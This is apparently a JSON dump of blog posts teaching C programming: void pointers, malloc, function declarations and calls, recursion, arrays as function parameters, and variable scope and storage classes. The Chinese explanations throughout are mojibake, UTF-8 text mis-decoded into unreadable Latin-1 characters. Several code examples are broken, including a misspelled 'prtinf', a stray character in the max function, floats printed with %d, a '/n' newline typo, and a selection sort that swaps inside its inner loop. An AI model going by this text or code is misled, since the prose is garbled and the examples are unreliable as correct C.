â€œæŒ‡å‘voidç±»å‹â€ç†è§£ä¸º æŒ‡å‘ç©ºç±»å‹æˆ–â€ä¸æŒ‡å‘ç¡®å®šçš„ç±»å‹â€çš„æ•°æ®. åœ¨å°†å®ƒçš„å€¼èµ‹ç»™å¦ä¸€æŒ‡é’ˆå˜é‡æ—¶ç”±ç³»ç»Ÿå¯¹å®ƒè¿›è¡Œç±»å‹è½¬æ¢.ä½¿ä¹‹é€‚åˆäºè¢«èµ‹å€¼çš„å˜é‡çš„ç±»åˆ« int a = 3; //å®šä¹‰aä¸ºæ•´å‹å˜é‡. int *p1 = &amp;a; //p1æŒ‡å‘intå‹å˜é‡ char *p2; //p2æŒ‡å‘charå‹å˜é‡ void *p3; //p3ä¸ºæ— ç±»å‹æŒ‡é’ˆå˜é‡(åŸºç±»å‹ä¸ºvoidå‹) p3 = (void *)p1; //å°†p1çš„å€¼è½¬æ¢ä¸ºvoid *ç±»å‹,ç„¶åèµ‹å€¼ç»™p3 p2 = (char *)p3; //å°†p3çš„å€¼è½¬æ¢ä¸ºchar *ç±»å‹,ç„¶åèµ‹å€¼ç»™p2 printf(&quot;%d&quot;, *p1); // 3 p3 = &amp;a; printf(&quot;%d&quot;, *p3); //éæ³•,p3æ˜¯æ— æŒ‡å‘çš„,ä¸èƒ½æŒ‡å‘a return 0; åœ¨è¿™ç§æ— æŒ‡å‘çš„åœ°å€æ‰€æ ‡å¿—çš„å­˜å‚¨å•å…ƒä¸­ä¸èƒ½å­˜å‚¨ä»»ä½•æ•°æ®çš„,æ— æ³•é€šè¿‡è¿™ç§åœ°å€å¯¹å†…å­˜å­˜å–æ•°æ®. ä»€ä¹ˆæƒ…å†µç”¨åˆ°è¿™ç§åœ°å€? è¿™ç§æƒ…å†µæ˜¯åœ¨è°ƒç”¨åŠ¨æ€å­˜å‚¨åˆ†é…å‡½æ•°(å¦‚maloc,caloc,realocå‡½æ•°)æ—¶å‡ºç°çš„. ç”¨æˆ·ç”¨è¿™äº›å‡½æ•°å¼€è¾ŸåŠ¨æ€å­˜å‚¨åŒº,æ˜¾ç„¶å¸Œæœ›è·å¾—æ­¤åŠ¨æ€å­˜å‚¨åŒºçš„èµ·å§‹åœ°å€,ä»¥ä¾¿åˆ©ç”¨è¯¥åŠ¨æ€å­˜å‚¨åŒº. åœ¨ä»¥å‰çš„Cç‰ˆæœ¬(åŒ…æ‹¬C89)ä¸­,å‡½æ•°çš„è¿”å›åœ°å€ä¸€å¾‹æŒ‡å‘å­—ç¬¦å‹æ•°æ®,å³å¾—åˆ°char*å‹æŒ‡é’ˆ. mallocå‡½æ•°çš„åŸå‹ä¸º: char *malloc(unsigned int sise); äººä»¬å¼€è¾Ÿçš„åŠ¨æ€å­˜å‚¨åŒºå¹¶ä¸æ˜¯ä¸€å®šç”¨æ¥å­˜æ”¾å­—ç¬¦å‹æ•°æ®çš„,ä¾‹å¦‚æƒ³ç”¨æ¥å­˜æ”¾ä¸€æ‰¹æ•´å‹æ•°æ®.ä¸ºæ­¤,åœ¨å‘è¯¥å­˜å‚¨åŒºå­˜æ”¾æ•°æ®å‰å°±éœ€è¦è¿›è¡Œåœ°å€çš„ç±»å‹è½¬æ¢: int *pt; pt = (int *)malloc(100); ç³»ç»Ÿä¼šå°†æŒ‡å‘å­—ç¬¦æ•°æ®çš„æŒ‡é’ˆè½¬æ¢ä¸ºæŒ‡å‘æ•´å‹æ•°æ®çš„æŒ‡é’ˆ,ç„¶åèµ‹ç»™pt.è¿™æ ·ptå°±æŒ‡å‘å­˜å‚¨åŒºçš„é¦–å­—èŠ‚,å¯ä»¥é€šè¿‡ptå¯¹è¯¥åŠ¨æ€å­˜å‚¨åŒºè¿›è¡Œå­˜å–æ“ä½œ. ä¸Šé¢çš„ç±»å‹è½¬æ¢åªæ˜¯äº§ç”Ÿä¸€ä¸ªä¸´æ—¶çš„ä¸­é—´å€¼èµ‹ç»™äº†pt,ä½†æ²¡æœ‰æ”¹å˜mallocå‡½æ•°æœ¬èº«çš„ç±»å‹. C99ä¿®æ”¹ä¸º:è¿”å›void*æŒ‡é’ˆ,è¿™ç§æŒ‡é’ˆä¸æŒ‡å‘ä»»ä½•ç±»å‹çš„æ•°æ®,åªæä¾›ä¸€ä¸ªçº¯åœ°å€. int *pt; pt = (int *)malloc(100); //malloc(100)æ˜¯voidç±»å‹,æŠŠå®ƒè½¬æ¢ä¸ºint*å‹ //ç­‰ä»·äº pt = malloc(100); //è‡ªåŠ¨è¿›è¡Œç±»å‹è½¬æ¢ å»ºç«‹åŠ¨æ€æ•°ç»„,è¾“å…¥5ä¸ªå­¦ç”Ÿçš„æˆç»©,å¦å¤–ç”¨ä¸€ä¸ªå‡½æ•°æ£€æŸ¥å…¶ä¸­æœ‰æ— ä½äº60åˆ†çš„,è¾“å‡ºä¸åˆæ ¼çš„æˆç»©.#include &lt;stdio.h&gt; int main() { void check(int *p); int *p1, i; p1 = (int *)malloc(5 * sizeof(int)); for (i = 0; i &lt; 5; i++) scanf(&quot;%d&quot;, p1 + i); check(p1); return 0; } void check(int *p) { int i; printf(&quot;They are fail:&quot;); for (i = 0; i &lt; 5; i++) if (p[i] &lt; 60) prtinf(&quot;%d&quot;, p[i]); printf(&quot;\\n&quot;); }","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://blog.kayleh.top/tags/C/"}]},{"title":"realize modular programming with functions","slug":"realize-modular-programming-with-functions","date":"2020-10-25T09:17:42.000Z","updated":"2021-04-11T17:11:28.516Z","comments":true,"path":"realize-modular-programming-with-functions/","link":"","permalink":"https://blog.kayleh.top/realize-modular-programming-with-functions/","excerpt":"","text":"ç”¨å‡½æ•°å®ç°æ¨¡å—åŒ–ç¨‹åºè®¾è®¡ Realize modular programming with functions ç”¨å‡½æ•°è¾“å‡ºä»¥ä¸‹ç»“æœï¼š ***************** How do you do! ***************** #include&lt;stdio.h&gt; int main() { void print_star();//å‡½æ•°çš„å£°æ˜ void print_message();//å‡½æ•°çš„å£°æ˜ print_star(); print_message(); print_star(); return 0; } void print_star() { printf(&quot;*****************\\n&quot;); } void print_message() { printf(&quot;How do you do!\\n&quot;); } å‡½æ•°å£°æ˜çš„ä½œç”¨æ˜¯æŠŠæœ‰å…³å‡½æ•°çš„ä¿¡æ¯(å‡½æ•°å,å‡½æ•°ç±»å‹,å‡½æ•°å‚æ•°çš„ä¸ªæ•°ä¸ç±»å‹)é€šçŸ¥ç¼–è¯‘ç³»ç»Ÿ,ä»¥ä¾¿åœ¨ç¼–è¯‘ç³»ç»Ÿå¯¹ç¨‹åºè¿›è¡Œç¼–è¯‘æ—¶,åœ¨è¿›è¡Œåˆ°mainå‡½æ•°è°ƒç”¨print_star()å’Œprint_message()æ—¶çŸ¥é“å®ƒä»¬æ˜¯å‡½æ•°è€Œä¸æ˜¯å˜é‡æˆ–å…¶ä»–å¯¹è±¡,è¿˜å¯¹è°ƒç”¨å‡½æ•°çš„æ­£ç¡®æ€§è¿›è¡Œæ£€æŸ¥. å‡½æ•°é—´å¯ä»¥äº’ç›¸è°ƒç”¨,ä½†ä¸èƒ½è°ƒç”¨mainå‡½æ•°,mainå‡½æ•°æ˜¯è¢«æ“ä½œç³»ç»Ÿè°ƒç”¨çš„. å‡½æ•°ä»ç”¨æˆ·ä½¿ç”¨çš„è§’åº¦çœ‹åˆ†ä¸º: åº“å‡½æ•° ç”¨æˆ·è‡ªå·±å®šä¹‰çš„å‡½æ•° ä»å‡½æ•°å½¢å¼åˆ†ä¸º: æ— å‚å‡½æ•° æœ‰å‚å‡½æ•° æ€ä¹ˆå®šä¹‰å‡½æ•°å®šä¹‰å‡½æ•°åº”åŒ…æ‹¬å“ªäº›å†…å®¹: å‡½æ•°çš„åå­—,æ–¹ä¾¿æŒ‰åè°ƒç”¨ å‡½æ•°çš„ç±»å‹,å³å‡½æ•°è¿”å›å€¼çš„ç±»å‹ å‡½æ•°çš„å‚æ•°çš„åå­—å’Œç±»å‹,è°ƒç”¨å‡½æ•°æ—¶éœ€è¦ä¼ é€’çš„æ•°æ® å‡½æ•°çš„åŠŸèƒ½,å‡½æ•°ä½“ å®šä¹‰æ— å‚å‡½æ•°ç±»å‹å å‡½æ•°å() { å‡½æ•°ä½“ } æˆ– ç±»å‹å å‡½æ•°å(void) { å‡½æ•°ä½“ } å‡½æ•°ä½“åŒ…æ‹¬å£°æ˜éƒ¨åˆ†(å˜é‡)å’Œè¯­å¥éƒ¨åˆ†. å®šä¹‰æœ‰å‚å‡½æ•°ç±»å‹å å‡½æ•°å(å½¢å¼å‚æ•°è¡¨åˆ—) { å‡½æ•°ä½“ } å®šä¹‰ç©ºå‡½æ•°ç±»å‹å å‡½æ•°å() {} è°ƒç”¨å‡½æ•°å‡½æ•°è°ƒç”¨çš„å½¢å¼ å‡½æ•°å(å®å‚è¡¨åˆ—) å‡½æ•°è°ƒç”¨æ–¹å¼ è°ƒç”¨è¯­å¥ å‡½æ•°è¡¨è¾¾å¼ è¦æ±‚å‡½æ•°å¸¦å›ä¸€ä¸ªç¡®å®šçš„å€¼ä»¥å‚åŠ è¡¨è¾¾å¼çš„è¿ç®— c=2*max(a,b); å‡½æ•°å‚æ•° å‡½æ•°è°ƒç”¨ä½œä¸ºå¦ä¸€ä¸ªå‡½æ•°è°ƒç”¨æ—¶çš„å®å‚,å¦‚: m=max(a,max(b,c)); å‡½æ•°è°ƒç”¨æ—¶çš„æ•°æ®ä¼ é€’å½¢å¼å‚æ•°å’Œå®é™…å‚æ•° å½¢å¼å‚æ•° åœ¨å®šä¹‰å‡½æ•°æ—¶å‡½æ•°ååé¢æ‹¬å·ä¸­çš„å˜é‡åç§°ä¸ºå½¢å¼å‚æ•° å®é™…å‚æ•° åœ¨ä¸»è°ƒå‡½æ•°è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ—¶,å‡½æ•°ååé¢æ‹¬å·ä¸­çš„å˜é‡åç§°ä¸ºå®é™…å‚æ•° å®å‚å’Œå½¢å‚é—´çš„æ•°æ®ä¼ é€’ åœ¨è°ƒç”¨å‡½æ•°è¿‡ç¨‹ä¸­,ç³»ç»Ÿä¼šæŠŠå®å‚ä¸­çš„å€¼ä¼ é€’ç»™è¢«è°ƒå‡½æ•°çš„å½¢å‚. è¾“å…¥ä¸¤ä¸ªæ•´æ•°,è¦æ±‚è¾“å‡ºå…¶ä¸­å€¼è¾ƒå¤§è€…,è¦æ±‚ç”¨å‡½æ•°æ¥æ‰¾åˆ°æœ€å¤§å€¼.#include&lt;stdio.h&gt; int main() { int max(int x, int y); int a, b, c; printf(&quot;please enter 2 integer numbers:&quot;); scanf(&quot;%d,%d&quot;, &amp;a, &amp;b); c = max(a, b); printf(&quot;max is %d&quot;, c); return 0; } int max(int x, int y) {c int z; z = x &gt; y ? x : y; return z; } å‡½æ•°è°ƒç”¨çš„æ‰§è¡Œè¿‡ç¨‹1)åœ¨å®šä¹‰å‡½æ•°ä¸­æŒ‡å®šçš„å½¢å‚,åœ¨æœªå‡ºç°å‡½æ•°è°ƒç”¨çš„æ—¶,å®ƒä»¬å¹¶ä¸å å†…å­˜ä¸­çš„å­˜å‚¨å•å…ƒ,åœ¨å‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶,å‡½æ•°maxçš„å½¢å‚æ‰è¢«ä¸´æ—¶åˆ†é…å†…å­˜å•å…ƒ. 2)å°†å®å‚çš„å€¼ä¼ é€’ç»™å¯¹åº”å½¢å‚ 3)åœ¨æ‰§è¡Œmaxå‡½æ•°æœŸé—´,ç”±äºå½¢å‚å·²ç»æœ‰å€¼,å°±å¯ä»¥åˆ©ç”¨å½¢å‚è¿›è¡Œæœ‰å…³çš„è¿ç®— 4)é€šè¿‡returnè¯­å¥å°†å‡½æ•°å€¼å¸¦å›åˆ°ä¸»è°ƒå‡½æ•°. 5)è°ƒç”¨ç»“æŸ,å½¢å‚å•å…ƒè¢«é‡Šæ”¾. æ³¨æ„:å®å‚å•å…ƒä»ä¿ç•™å¹¶ç»´æŒåŸå€¼.æ²¡æœ‰æ”¹å˜.å¦‚æœåœ¨æ‰§è¡Œä¸€ä¸ªè¢«è°ƒå‡½æ•°æ—¶,å½¢å‚çš„å€¼å‘ç”Ÿæ”¹å˜,ä¸ä¼šæ”¹å˜ä¸»è°ƒå‡½æ•°çš„å®å‚çš„å€¼.å¦‚:åœ¨æ‰§è¡Œmaxå‡½æ•°æ—¶,xå’Œyçš„å€¼å˜ä¸º10å’Œ15,ä½†aå’Œbä»ä¸º2å’Œ3,è¿™æ˜¯å› ä¸ºå½¢å‚å’Œå®å‚æ˜¯ä¸¤ä¸ªä¸åŒçš„å­˜å‚¨å•å…ƒ. å‡½æ•°çš„è¿”å›å€¼ å‡½æ•°çš„è¿”å›å€¼æ˜¯é€šè¿‡returnè¯­å¥ä¸­è·å¾—çš„. å‡½æ•°è¿”å›å€¼çš„ç±»å‹æ˜¯å‡½æ•°çš„ç±»å‹. åœ¨å®šä¹‰å‡½æ•°æ—¶æŒ‡å®šçš„å‡½æ•°ç±»å‹ä¸€èˆ¬åº”è¯¥å’Œreturnè¯­å¥ä¸­çš„è¡¨è¾¾å¼ç±»å‹ä¸€è‡´. å°†åœ¨maxå‡½æ•°ä¸­å®šä¹‰çš„å˜é‡zæ”¹ä¸ºfloatå‹,å‡½æ•°è¿”å›å€¼ä¸æŒ‡å®šçš„å‡½æ•°ç±»å‹ä¸åŒ #include&lt;stdio.h&gt; int main() { int max(float x, float y); float a, b; int c; scanf(&quot;%f,%f&quot;, &amp;a, &amp;b); c = max(a, b); printf(&quot;max is %d&quot;, c); return 0; } int max(float x, float y) { float z; z = x &gt; y ? x : y; return (z); } --------- 1.5,2.6 max is 2 å¯¹è¢«è°ƒç”¨å‡½æ•°çš„å£°æ˜å’Œå‡½æ•°åŸå‹è¾“å…¥ä¸¤ä¸ªå®æ•°,ç”¨ä¸€ä¸ªå‡½æ•°æ±‚å®ƒä»¬ä¹‹å’Œ. #include&lt;stdio.h&gt; int main() { float add(float x, float y); float a, b, c; scanf(&quot;%f,%f&quot;, &amp;a, &amp;b); c = add(a, b); printf(&quot;sum is %d&quot;, c); return 0; } float add(float x, float y) { float z; z = x + y; return (z); } å‡½æ•°å£°æ˜çš„ä¸¤ç§å½¢å¼1)å‡½æ•°ç±»å‹ å‡½æ•°å(å‚æ•°ç±»å‹1 å‚æ•°å1,å‚æ•°ç±»å‹2 å‚æ•°å2,â€¦å‚æ•°ç±»å‹n å‚æ•°ån) 2)å‡½æ•°ç±»å‹ å‡½æ•°å(å‚æ•°ç±»å‹1,å‚æ•°ç±»å‹2,â€¦,å‚æ•°ç±»å‹n) ç¼–è¯‘ç³»ç»Ÿåªå…³å¿ƒå’Œæ£€æŸ¥å‚æ•°ä¸ªæ•°å’Œå‚æ•°ç±»å‹,è€Œä¸æ£€æŸ¥å‚æ•°å,å› ä¸ºåœ¨è°ƒç”¨å‡½æ•°æ—¶åªè¦æ±‚ä¿è¯å®å‚ç±»å‹ä¸å½¢å‚ç±»å‹ä¸€è‡´,è€Œä¸å¿…è€ƒè™‘å½¢å‚åæ˜¯ä»€ä¹ˆ.å› æ­¤åœ¨å‡½æ•°å£°æ˜ä¸­ å‡½æ•°åŸå‹å‡½æ•°çš„é¦–éƒ¨ç§°ä¸ºå‡½æ•°åŸå‹ å‡½æ•°çš„åµŒå¥—è°ƒç”¨è¾“å…¥4ä¸ªæ•´æ•°,æ‰¾å‡ºå…¶ä¸­æœ€å¤§çš„æ•°#include&lt;stdio.h&gt; int main() { int max4(int a, int b, int c, int d); int a, b, c, d, max; printf(&quot;please enter 4 integer numbers:&quot;); scanf(&quot;%d %d %d %d&quot;, &amp;a, &amp;b, &amp;c, &amp;d); max = max4(a, b, c, d); printf(&quot;max:%d&quot;, max); return 0; } int max2(int a, int b) { if (a &gt;= b) return a; else return b; } int max4(int a, int b, int c, int d) { int max2(int, int);//å‡½æ•°å£°æ˜ int m; m = max2(a, b); m = max2(m, c); m = max2(m, d); return m; } æ”¹è¿›: #include&lt;stdio.h&gt; int main() { int max4(int a, int b, int c, int d); int a, b, c, d, max; printf(&quot;please enter 4 integer numbers:&quot;); scanf(&quot;%d %d %d %d&quot;, &amp;a, &amp;b, &amp;c, &amp;d); max = max4(a, b, c, d); printf(&quot;max:%d&quot;, max); return 0; } int max2(int a, int b) { return a &gt;= b ? a : b; } int max4(int a, int b, int c, int d) { int max2(int, int);//å‡½æ•°å£°æ˜ return max2(max2(max2(a, b), c), d);; } å‡½æ•°çš„é€’å½’è°ƒç”¨ ä¸€ä¸ªé€’å½’çš„é—®é¢˜å¯ä»¥åˆ†ä¸ºâ€å›æº¯â€å’Œâ€é€’æ¨â€ä¸¤ä¸ªé˜¶æ®µ. ç”¨é€’å½’çš„æ–¹æ³•æ±‚n! . n!=1 (n=0,1) n!=nÃ—(n-1) (n&gt;1) #include&lt;stdio.h&gt; int main() { int fac(int n); int n, y; printf(&quot;please enter an integer number:&quot;); scanf(&quot;%d&quot;, &amp;n); y = fac(n); printf(&quot;%d!=%d&quot;, n,y); return 0; } int fac(int n) { int f; if (n &lt; 0) printf(&quot;n&lt;0.data error!&quot;); else if (n == 0 || n == 1) f = 1; else f = fac(n - 1) * n; return f; } æ±‰è¯ºå¡”é—®é¢˜#include&lt;stdio.h&gt; int main() { void hanoi(int n, char one, char two, char three); int m; printf(&quot;input the number of diskes:&quot;); scanf(&quot;%d&quot;, &amp;m); hanoi(m, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;); return 0; } void hanoi(int n, char one, char two, char three) { //å°†nä¸ªç›˜ä»oneåº§å€ŸåŠ©twoåº§ç§»åŠ¨åˆ°threeåº§ void move(char x, char y); if (n == 1) move(one, three); else { hanoi(n - 1, one, three, two); move(one, three); hanoi(n - 1, two, one, three); } } void move(char x, char y) { printf(&quot;%c --&gt; %c\\n&quot;, x, y); } æ•°ç»„ä½œä¸ºå‡½æ•°å‚æ•° åœ¨ç”¨æ•°ç»„å…ƒç´ ä½œå‡½æ•°å®å‚æ—¶,æŠŠå®å‚çš„å€¼ä¼ ç»™å½¢å‚,æ˜¯â€œå€¼ä¼ é€’â€æ–¹å¼,æ•°æ®çš„ä¼ é€’æ˜¯ç”±å½¢å‚ä¼ åˆ°å®å‚,å•å‘ä¼ é€’. è¾“å…¥10ä¸ªæ•°,è¦æ±‚è¾“å‡ºå…¶ä¸­å€¼æœ€å¤§çš„å…ƒç´ å’Œè¯¥æ•°æ˜¯ç¬¬å‡ ä¸ªæ•°.#include&lt;stdio.h&gt; int main() { int max(int x, int y); int a[10], i, m, n; printf(&quot;please enter 10 integer numbers:&quot;); for (i = 0; i &lt; 10; i++) { scanf(&quot;%d&quot;, &amp;a[i]); } printf(&quot;\\n&quot;); for (i = 1, n = 0, m = a[0]; i &lt; 10; i++) { if (max(m, a[i]) &gt; m) { m = max(m, a[i]); n = i; } } printf(&quot;the large number is %d\\nit is the %dth number.&quot;, m, n + 1); return 0; } int max(int x, int y) { return x &gt; y ? x : y; } ä¸€ç»´æ•°ç»„åä½œå‡½æ•°å‚æ•°æœ‰ä¸€ä¸ªä¸€ç»´æ•°ç»„score,å†…æ”¾10ä¸ªå­¦ç”Ÿæˆç»©,æ±‚å¹³å‡æˆç»©.#include&lt;stdio.h&gt; int main() { float average(float array[10]); float score[10], aver; int i; printf(&quot;input 10 scores:\\n&quot;); for (i = 0; i &lt; 10; i++) scanf(&quot;%f&quot;, &amp;score[i]); printf(&quot;\\n&quot;); aver = average(score); printf(&quot;average score is %5.2f\\n&quot;, aver); return 0; } float average(float array[10]) { int i; float aver, sum = array[0]; for (i = 1; i &lt; 10; i++) sum = sum + array[i]; aver = sum / 10; return aver; } å½¢å‚æ•°ç»„å¯ä»¥ä¸æŒ‡å®šå¤§å°,åœ¨å®šä¹‰æ•°ç»„æ—¶åœ¨æ•°ç»„åååŠ ä¸Šç©ºæ‹¬å·,å¦‚ float average(float array[]) æœ‰ä¸¤ä¸ªç­çº§,åˆ†åˆ«æœ‰35åå’Œ39åå­¦ç”Ÿ,è°ƒç”¨ä¸€ä¸ªaverageå‡½æ•°,åˆ†åˆ«æ±‚ä¸¤ä¸ªç­çš„å­¦ç”Ÿçš„å¹³å‡æˆç»©.#include&lt;stdio.h&gt; int main() { float average(float array[], int n); float score1[5] = {89, 99.5, 99, 45, 78}; float score2[10] = {85.5, 10.5, 87.5, 78.5, 67.5, 90.5, 99.5, 87.5, 88, 78.5}; //ç”¨æ•°ç»„åä½œå®å‚ printf(&quot;The average of class A is %6.2f\\n&quot;, average(score1, 5)); printf(&quot;The average of class B is %6.2f\\n&quot;, average(score2, 10)); return 0; } float average(float array[], int n) { int i; float aver, sum = array[0]; for (i = 1; i &lt; n; i++) sum = sum + array[i]; aver = sum / n; return (aver); } ä½¿ç”¨é€‰æ‹©æ³•å¯¹10ä¸ªæ•´æ•°ä»å°åˆ°å¤§æ’åº#include&lt;stdio.h&gt; int main() { void sort(int array[], int n); int a[10], i; printf(&quot;please enter array:&quot;); for (i = 0; i &lt; 10; i++) { scanf(&quot;%d&quot;, &amp;a[i]); } sort(a, 10); printf(&quot;the sorted array:&quot;); for (i = 0; i &lt; 10; i++) { printf(&quot;%d&quot;, a[i]); } printf(&quot;/n&quot;); return 0; } void sort(int array[], int n) { int i, j, k, t; for (i = 0; i &lt; n - 1; i++) { k = i; for (j = i + 1; j &lt; n; j++) { if (array[j] &lt; array[k]) k = j; t = array[k]; array[k] = array[i]; array[i] = t; } } } å¤šç»´æ•°ç»„åä½œå‡½æ•°å‚æ•°å¯ä»¥ä½¿ç”¨å¤šç»´å‡½æ•°æ•°ç»„åä½œä¸ºå‡½æ•°çš„å®å‚å’Œå½¢å‚. å½¢å‚æ•°ç»„å’Œå®å‚æ•°ç»„éƒ½æ˜¯ç”±ç›¸åŒç±»å‹å’Œå¤§å°çš„ä¸€ç»´æ•°ç»„ç»„æˆçš„.Cè¯­è¨€ç¼–è¯‘ç³»ç»Ÿä¸æ£€æŸ¥ç¬¬ä¸€ç»´çš„å¤§å°. æœ‰ä¸€ä¸ª3Ã—4çš„çŸ©é˜µ,æ±‚æ‰€æœ‰å…ƒç´ çš„æœ€å¤§å€¼.#include&lt;stdio.h&gt; int main() { int max_value(int array[][4]); int a[3][4] = {{1, 3, 5, 7}, {2, 4, 6, 8}, {15, 17, 34, 12}}; printf(&quot;max value is %d&quot;, max_value(a)); } int max_value(int array[][4]) { int max, i, j; max = array[0][0]; for (i = 0; i &lt; 3; ++i) { for (j = 0; j &lt; 4; ++j) { if (array[i][j] &gt; max) max = array[i][j]; } } return max; } æ³¨æ„: 1.å½¢å‚æ•°ç»„arrayç¬¬ä¸€ç»´çš„å¤§å°çœç•¥,ç¬¬2ç»´å¤§å°ä¸èƒ½çœç•¥,è€Œä¸”è¦å’Œå®å‚æ•°ç»„açš„ç¬¬2ç»´å¤§å°ç›¸åŒ. 2.åœ¨ä¸»å‡½æ•°è°ƒç”¨max_valueå‡½æ•°æ—¶,æŠŠå®å‚äºŒç»´æ•°ç»„açš„ç¬¬1è¡Œçš„èµ·å§‹åœ°å€ä¼ é€’ç»™å½¢å‚æ•°ç»„array.å› æ­¤arrayæ•°ç»„ç¬¬ä¸€è¡Œçš„èµ·å§‹åœ°å€ä¸aæ•°ç»„çš„ç¬¬ä¸€è¡Œèµ·å§‹åœ°å€ç›¸åŒ. å±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡ä½œç”¨åŸŸ æ¯ä¸ªå˜é‡éƒ½æœ‰ä½œç”¨åŸŸé—®é¢˜,å³å®ƒä»¬åœ¨ä»€ä¹ˆèŒƒå›´å†…æœ‰æ•ˆ. å±€éƒ¨å˜é‡å®šä¹‰å˜é‡æœ‰3ç§æƒ…å†µ: (1)åœ¨å‡½æ•°çš„å¼€å¤´å®šä¹‰ (2)åœ¨å‡½æ•°å†…çš„å¤åˆè¯­å¥å†…å®šä¹‰ (3)åœ¨å‡½æ•°çš„å¤–éƒ¨å®šä¹‰ è¯´æ˜:1.ä¸»å‡½æ•°ä¸­å®šä¹‰çš„å˜é‡ä¹Ÿåªåœ¨ä¸»å‡½æ•°ä¸­æœ‰æ•ˆ 2.ä¸åŒå‡½æ•°ä¸­å¯ä»¥ä½¿ç”¨åŒåçš„å˜é‡ 3.å½¢å¼å‚æ•°ä¹Ÿæ˜¯å±€éƒ¨å˜é‡ 4.åœ¨ä¸€ä¸ªå‡½æ•°å†…éƒ¨,å¯ä»¥åœ¨å¤åˆè¯­å¥ä¸­å®šä¹‰å˜é‡,è¿™äº›å˜é‡åªåœ¨æœ¬å¤åˆè¯­å¥ä¸­æœ‰æ•ˆ,è¿™ç§å¤åˆè¯­å¥ä¹Ÿç§°ä¸ºâ€åˆ†ç¨‹åºâ€æˆ–â€ç¨‹åºå—â€.ç¦»å¼€å¤åˆè¯­å¥,å˜é‡å°±æ— æ•ˆ,ç³»ç»Ÿä¼šæŠŠå ç”¨çš„å†…å­˜èµ„æºé‡Šæ”¾. å…¨å±€å˜é‡ ç¨‹åºçš„ç¼–è¯‘å•ä½æ˜¯æºç¨‹åºæ–‡ä»¶. åœ¨å‡½æ•°ä¹‹å†…å®šä¹‰çš„å˜é‡æ˜¯å±€éƒ¨å˜é‡, åœ¨å‡½æ•°ä¹‹å¤–å®šä¹‰çš„å˜é‡æ˜¯å¤–éƒ¨å˜é‡,æ˜¯å…¨å±€å˜é‡.å®ƒçš„æœ‰æ•ˆèŒƒå›´ä¸ºä»å®šä¹‰å˜é‡çš„ä½ç½®å¼€å§‹åˆ°æœ¬æºç¨‹åºæ–‡ä»¶ç»“æŸ. éå¿…è¦ä¸å»ºè®®ä½¿ç”¨å…¨å±€å˜é‡:1.åœ¨å…¨éƒ¨æ‰§è¡Œè¿‡ç¨‹ä¸­éƒ½å ç”¨å­˜å‚¨å•å…ƒ,è€Œä¸æ˜¯ä»…åœ¨éœ€è¦æ—¶æ‰å¼€è¾Ÿå•å…ƒ. 2.å‡ä½ç¨‹åºçš„æ¸…æ™°æ€§,ä¸æ˜“ç»´æŠ¤ å˜é‡çš„å­˜å‚¨æ–¹å¼å’Œç”Ÿå­˜æœŸåŠ¨æ€å­˜å‚¨æ–¹å¼å’Œé™æ€å­˜å‚¨æ–¹å¼ä»å˜é‡å€¼çš„å­˜åœ¨æ—¶é—´(å³ç”Ÿå­˜æœŸ)æ¥åˆ†: é™æ€å­˜å‚¨æ–¹å¼:ç¨‹åºåœ¨è¿è¡ŒæœŸé—´ç”±ç³»ç»Ÿåˆ†é…å›ºå®šçš„å­˜å‚¨ç©ºé—´çš„æ–¹å¼ åŠ¨æ€å­˜å‚¨æ–¹å¼:ç¨‹åºè¿è¡ŒæœŸé—´æ ¹æ®éœ€è¦è¿›è¡ŒåŠ¨æ€çš„åˆ†é…å­˜å‚¨ç©ºé—´çš„æ–¹å¼. æ•°æ®åˆ†åˆ«å­˜æ”¾åœ¨é™æ€å­˜å‚¨åŒºå’ŒåŠ¨æ€å­˜å‚¨åŒº,å…¨å±€å˜é‡å…¨éƒ¨å­˜æ”¾åœ¨é™æ€å­˜å‚¨åŒºä¸­. åœ¨åŠ¨æ€å­˜å‚¨åŒºä¸­å­˜æ”¾ä»¥ä¸‹æ•°æ®: â‘ å‡½æ•°å½¢å¼å‚æ•°ã€‚åœ¨è°ƒç”¨å‡½æ•°æ—¶ç»™å½¢å‚åˆ†é…å­˜å‚¨ç©ºé—´ã€‚ â‘¡å‡½æ•°ä¸­å®šä¹‰çš„æ²¡æœ‰ç”¨å…³é”®å­—staticå£°æ˜çš„å˜é‡,å³è‡ªåŠ¨å˜é‡. â‘¢å‡½æ•°è°ƒç”¨æ—¶çš„ç°åœºä¿æŠ¤å’Œè¿”å›åœ°å€. å¦‚æœåœ¨ä¸€ä¸ªç¨‹åºä¸­ä¸¤æ¬¡è°ƒç”¨åŒä¸€å‡½æ•°,è€Œåœ¨æ­¤å‡½æ•°ä¸­å®šä¹‰äº†å±€éƒ¨å˜é‡,åœ¨ä¸¤æ¬¡è°ƒç”¨æ—¶åˆ†é…ç»™è¿™äº›å±€éƒ¨å˜é‡çš„å­˜å‚¨ç©ºé—´çš„åœ°å€å¯èƒ½ä¸ä¸€æ ·. æ¯ä¸ªå˜é‡å’Œå‡½æ•°éƒ½æœ‰ä¸¤ä¸ªå±æ€§,æ•°æ®ç±»å‹(å¦‚æ•´å‹,æµ®ç‚¹å‹)å’Œæ•°æ®çš„å­˜å‚¨ç±»å‹(é™æ€å­˜å‚¨,åŠ¨æ€å­˜å‚¨). åœ¨å®šä¹‰å’Œå£°æ˜å˜é‡å’Œå‡½æ•°æ—¶,ä¸€èˆ¬åº”åŒæ—¶æŒ‡å®šå…¶æ•°æ®æ•°æ®ç±»å‹å’Œå­˜å‚¨ç±»å‹,ä¹Ÿå¯ä»¥ä»¥é»˜è®¤çš„æ–¹å¼æŒ‡å®š(å³å¦‚æœç”¨æˆ·ä¸æŒ‡å®š,ç³»ç»Ÿä¼šéšå«åœ°æŒ‡å®šä¸ºæŸä¸€ç§å­˜å‚¨ç±»å‹). Cçš„å­˜å‚¨ç±»åˆ«: è‡ªåŠ¨çš„(auto) é™æ€çš„(static) å¯„å­˜å™¨çš„(register) å¤–éƒ¨çš„(extern) 